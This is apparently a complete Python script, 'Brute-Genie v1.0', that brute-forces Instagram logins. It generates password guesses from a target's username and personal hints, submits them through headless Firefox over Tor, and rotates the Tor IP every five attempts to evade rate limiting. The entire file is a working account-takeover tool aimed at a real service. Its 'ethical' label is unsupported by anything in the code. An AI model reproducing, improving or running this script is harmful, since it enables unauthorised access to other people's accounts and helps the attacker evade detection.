import os
import time
import random
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.options import Options
from stem import Signal
from stem.control import Controller
from tqdm import tqdm
from colorama import Fore, Style, init

init(autoreset=True)

def rotate_ip(password):
    try:
        with Controller.from_port(port=9051) as controller:
            controller.authenticate(password=password)
            controller.signal(Signal.NEWNYM)
            print(Fore.CYAN + "[*] Tor IP rotated.")
    except Exception as e:
        print(Fore.RED + f"[!] Tor IP rotation failed: {e}")

def get_browser():
    options = Options()
    options.headless = True
    profile = webdriver.FirefoxProfile()
    profile.set_preference('network.proxy.type', 1)
    profile.set_preference('network.proxy.socks', '127.0.0.1')
    profile.set_preference('network.proxy.socks_port', 9050)
    profile.set_preference('network.proxy.socks_remote_dns', True)
    profile.update_preferences()
    return webdriver.Firefox(firefox_profile=profile, options=options)

def generate_wordlist(username, hints):
    common_passwords = ['123456', 'password', 'admin', '123456789', username + '123', username + '@123']
    combined = set(common_passwords)
    for hint in hints:
        combined.update({
            hint,
            hint + '123',
            hint.capitalize() + '@123',
            username + hint,
            hint + '2024'
        })
    return list(combined)

def brute_force(username, wordlist, tor_password):
    print(f"\n🚀 Starting bruteforce on {username}...\n")
    attempt = 0
    total = len(wordlist)
    bar = tqdm(total=total, desc="🔐 Bruteforcing", ncols=75)

    for password in wordlist:
        driver = get_browser()
        attempt += 1
        try:
            driver.get("https://www.instagram.com/accounts/login/")
            time.sleep(random.uniform(5, 7))

            user_input = driver.find_element(By.NAME, 'username')
            pass_input = driver.find_element(By.NAME, 'password')
            login_btn = driver.find_element(By.XPATH, '//button[@type="submit"]')

            user_input.send_keys(username)
            pass_input.send_keys(password)
            login_btn.click()

            time.sleep(random.uniform(5, 7))

            if "challenge" in driver.current_url or "two_factor" in driver.current_url:
                print(Fore.GREEN + f"\n🎯 SUCCESS! Password found: {password}\n")
                break
            else:
                print(Fore.YELLOW + f"[{attempt}/{total}] Tried: {password} — Failed")

            if attempt % 5 == 0:
                rotate_ip(tor_password)

        except Exception as e:
            print(Fore.RED + f"[!] Error on attempt {attempt}: {str(e)}")
        finally:
            driver.quit()
            bar.update(1)

    bar.close()
    print(Style.BRIGHT + "\n🛑 Bruteforce finished.\n")

def main():
    os.system('clear')
    print(Fore.MAGENTA + "\n🧠 Brute-Genie v1.0 - Ethical Brute Force Framework")
    username = input("👤 Enter Instagram username: ")
    tor_password = input("🔑 Enter your Tor control password: ")
    hints = input("📝 Enter password hints separated by commas: ").split(',')
    custom_words = input("➕ Add custom passwords (comma-separated): ").split(',')

    wordlist = generate_wordlist(username, hints)
    wordlist.extend(custom_words)
    wordlist = list(set(wordlist))

    brute_force(username, wordlist, tor_password)

if __name__ == '__main__':
    main()
